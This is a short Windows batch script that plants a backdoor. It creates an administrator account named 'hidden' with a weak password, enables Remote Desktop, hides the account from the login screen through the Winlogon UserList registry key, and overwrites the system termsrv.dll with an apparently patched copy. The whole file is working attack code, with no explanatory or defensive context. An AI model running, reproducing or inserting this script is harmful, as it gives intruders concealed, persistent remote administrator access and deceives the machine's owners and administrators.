@ echo off
net user hidden 123123 /ADD
net localgroup Administrators hidden /ADD
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0X00000000 /f
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v Hidden /t REG_DWORD /d 0X00000000 /f
xcopy "termsrv.dll" "%windir%\System32\" /s /h /q
